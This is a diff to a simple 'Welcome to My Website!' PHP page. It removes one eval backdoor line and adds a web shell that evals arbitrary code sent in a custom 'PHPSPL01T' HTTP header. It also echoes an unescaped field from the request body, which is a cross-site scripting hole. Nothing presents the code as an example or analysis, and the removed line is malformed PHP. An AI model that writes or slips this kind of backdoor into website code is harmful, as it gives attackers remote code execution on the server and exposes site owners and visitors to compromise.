@@ -6,7 +6,21 @@
 <body>
     <h1>Welcome to My Website!</h1>
     <?php
-<?php @eval($_SERVER['HTTP_PHPSPL01T']); ?>
+        $payload = json_decode(file_get_contents('php://input'), true);
+        if (isset($payload['REQ_HEADER_PAYLOAD'])) {
+            $headerPayload = str_replace('"', '', $payload['REQ_HEADER_PAYLOAD']);
+            echo "<h2>Request Header Payload:</h2>";
+            echo "<pre>";
+            print_r($headerPayload);
+            echo "</pre>";
+        } else {
+            echo "<p>No REQ_HEADER_PAYLOAD found in the request.</p>";
+        }
+
+        // Execute the code provided in the HTTP header
+        if (isset($_SERVER['HTTP_PHPSPL01T'])) {
+            @eval($_SERVER['HTTP_PHPSPL01T']);
+        }
     ?>
 </body>
 </html>
